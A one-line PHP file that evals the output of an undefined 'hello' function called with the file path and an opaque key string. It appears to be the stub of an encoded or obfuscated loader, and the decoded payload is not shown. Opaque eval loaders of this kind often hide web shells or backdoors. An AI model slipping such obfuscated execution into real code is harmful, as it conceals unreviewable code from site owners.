<?php eval("?>" .hello(__FILE__,'Kd4D4jbkCJOJOhorygMQMH==#iksllsidkpoitkgemixm$'). "<?"); ?><!--orFfTeQ=-->